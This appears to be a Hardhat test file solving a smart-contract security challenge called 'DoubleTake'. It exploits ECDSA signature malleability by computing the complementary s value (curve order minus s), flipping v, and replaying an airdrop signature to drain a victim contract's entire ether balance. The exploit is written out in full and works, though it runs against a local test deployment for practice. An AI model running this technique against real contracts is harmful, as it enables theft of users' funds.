const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DoubleTake";

describe(NAME, function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy({
      value: ethers.utils.parseEther("2"),
    });

    return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, attackerWallet;
    before(async function () {
      ({ victimContract, attackerWallet } = await loadFixture(setup));

      // claim your first Ether
      const v = 28;
      const r =
        "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
      const s =
        "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

      await victimContract
        .connect(attackerWallet)
        .claimAirdrop(
          "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
          ethers.utils.parseEther("1"),
          v,
          r,
          s
        );
    });

    //
    //  hack this guy
    //
    it("take everything", async function () {
      //get balance of contract to take
      const balance = await ethers.provider.getBalance(victimContract.address);

      //create inverse signature
      const g =
        "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141";
      const r =
        "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
      const s =
        "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";
      const s2 = "0x" + (BigInt(g) - BigInt(s)).toString(16);
      const v2 = 27;

      // claim aidrop with inverse signature
      await victimContract
        .connect(attackerWallet)
        .claimAirdrop(
          "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
          balance,
          v2,
          r,
          s2
        );
    });

    after(async function () {
      expect(await ethers.provider.getBalance(victimContract.address)).to.equal(
        0,
        "victim contract is drained"
      );
    });
  });
});
